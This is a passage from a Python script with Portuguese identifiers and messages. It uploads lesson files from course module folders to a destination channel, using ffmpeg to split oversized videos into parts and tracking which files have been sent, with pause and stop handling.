                        pname = f"{f.stem} - Parte {i+1}{f.suffix}"
                        ppath = f.parent / pname
                        subprocess.run([ffmpeg_exe, '-y', '-i', str(f), '-ss', str(i*pdura), '-t', str(pdura), '-c', 'copy', str(ppath)], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
                        pcap = f"[Parte {i+1}/{parts}] " + cap if usar_leg else cap
                        await processar_ficheiro_com_retry(ppath, pcap, is_video, True, pid)
                    if not parada_definitiva: registrar_envio(f, enviados)
                else:
                    if f.stat().st_size > limite_bytes: continue
                    await processar_ficheiro_com_retry(f, cap, is_video)
            
        for aula_dir in sorted(modulo_dir.iterdir(), key=lambda x: natural_sort_key(x.name)):
            await checar_pausa()
            if not aula_dir.is_dir() or parada_definitiva: continue
            
            aula_files = [f for f in sorted(aula_dir.iterdir(), key=lambda x: natural_sort_key(x.name)) if f.is_file() and f.name.lower() != 'descricao.md' and f.suffix.lower() in extensoes_permitidas]
            if not aula_files: continue
            
            if not printed_mod:
                tqdm.write(f"\n📁 Módulo: {modulo_dir.name}")
                printed_mod = True
                
            hashtag_atual = f"#F{contador_hashtag:03d}"
            contador_hashtag += 1
            desc = ""
            if (aula_dir / "descricao.md").exists():
                try:
                    with open(aula_dir / "descricao.md", "r", encoding="utf-8") as file_md: desc = file_md.read().strip()
                except: pass
                
            leg_comp = f"**{modulo_dir.name}**\n**Aula:** {aula_dir.name}\n\n{desc}\n\n{hashtag_atual}"
            if len(leg_comp) > 1000: leg_comp = leg_comp[:1000] + f"...\n\n{hashtag_atual}"
            enviou_principal = False
            
            for f in aula_files:
                await checar_pausa()
                if parada_definitiva: break
                if f.stat().st_size == 0 or str(f) in enviados: continue
                is_video = f.suffix.lower() in ['.mp4', '.mkv', '.avi', '.mov', '.webm']
                usar_leg = is_video or not enviou_principal
                cap = leg_comp if usar_leg else f"📎 Anexo: {f.name}\n{hashtag_atual}"
                enviou_principal = True
                
                if f.stat().st_size > limite_bytes and auto_split_enabled and is_video:
                    parts = math.ceil(f.stat().st_size / (limite_bytes * 0.90))
                    try: dura = TinyTag.get(str(f)).duration
                    except: registrar_envio(f, enviados); continue
                    pdura = dura / parts
                    for i in range(parts):
                        await checar_pausa()
                        if parada_definitiva: break
                        pid = f"{f}::parte{i+1}"
                        if pid in enviados: continue
                        pname = f"{f.stem} - Parte {i+1}{f.suffix}"
                        ppath = f.parent / pname
                        subprocess.run([ffmpeg_exe, '-y', '-i', str(f), '-ss', str(i*pdura), '-t', str(pdura), '-c', 'copy', str(ppath)], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
                        pcap = f"[Parte {i+1}/{parts}] " + cap if usar_leg else cap
                        await processar_ficheiro_com_retry(ppath, pcap, is_video, True, pid)
                    if not parada_definitiva: registrar_envio(f, enviados)
                else:
                    if f.stat().st_size > limite_bytes: continue
                    await processar_ficheiro_com_retry(f, cap, is_video)

    barra_geral.close()

    if parada_definitiva:
        tqdm.write("\n🛑 Upload encerrado de forma segura.")
        _sync_index_metadata(f"🛑 **Upload Pausado** pelo utilizador.\nCanal: {CANAL_DESTINO}")
    else:
        tqdm.write("\n✅ Upload 100% concluído!")
        _sync_index_metadata(f"✅ **Upload Concluído**\nO utilizador terminou o projeto para o canal: {CANAL_DESTINO}")

    await client.disconnect()

if __name__ == '__main__':
    try:
        asyncio.run(upload_curso())
    except KeyboardInterrupt:
        pass